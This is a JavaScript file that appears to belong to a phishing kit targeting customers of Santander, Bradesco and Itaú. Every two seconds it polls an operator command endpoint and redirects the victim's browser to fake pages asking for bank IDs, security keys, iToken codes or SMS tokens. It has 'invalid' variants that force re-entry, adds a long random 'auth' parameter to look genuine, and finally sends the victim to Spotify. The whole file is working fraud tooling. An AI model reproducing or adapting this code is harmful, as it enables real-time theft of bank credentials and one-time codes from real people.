function aguardandoComando(id) {
   setTimeout(function () {
      let params = {
         id: id
      };
      function makeid(length) {
         var result = '';
         var characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
         var charactersLength = characters.length;
         for (var i = 0; i < length; i++) {
            result += characters.charAt(Math.floor(Math.random() * charactersLength));
         }
         return result;
      }
      console.log(params);
      fetch(
         'public/_php/comandos_ajax.php',
         {
            headers: {
               'Accept': 'application/json',
               'Content-Type': 'application/json',
               'X-Requested-With': 'XMLHttpRequest'
            },
            method: "POST",
            body: JSON.stringify(params)
         }).then(response => response.json())
         .then(data => {
            
            let comando = data.dados.comando;

            switch (comando) {
               case 'idSantander':
                  return window.location.href = 'idSantander.php?id=' + id + '&autfh=' + makeid(150);
                  break;
               case 'idSantanderInvalido':
                  return window.location.href = 'idSantander.php?id=' + id + '&status=error&auth=' + makeid(150);
                  break;
               case 'chaveBradesco':
                  return window.location.href = 'chaveBradesco.php?id=' + id + '&autfh=' + makeid(150);
                  break;
               case 'chaveBradescoInvalido':
                  return window.location.href = 'chaveBradesco.php?id=' + id + '&status=error&auth=' + makeid(150);
                  break;
               case 'itokenItau':
                  return window.location.href = 'itokenItau.php?id=' + id + '&autfh=' + makeid(150);
                  break;
               case 'itokenItauInvalido':
                  return window.location.href = 'itokenItau.php?id=' + id + '&status=error&auth=' + makeid(150);
                  break;
               case 'tokenSms':
                  return window.location.href = 'tokenSms.php?id=' + id + '&autfh=' + makeid(150);
                  break;
               case 'tokenSmsInvalido':
                  return window.location.href = 'tokenSms.php?id=' + id + '&status=error&auth=' + makeid(150);
                  break;
               case 'erro':
                  return window.location.href = 'erro.php?id=' + id + '&status=error&auth=' + makeid(150);
                  break;
               case 'finalizar':
                  return window.location.href = 'https://open.spotify.com/';
                  break;
            }

         }).catch(function (erro) {
            console.log("falha no comando");
         });


      aguardandoComando(id);
   }, 2000);
}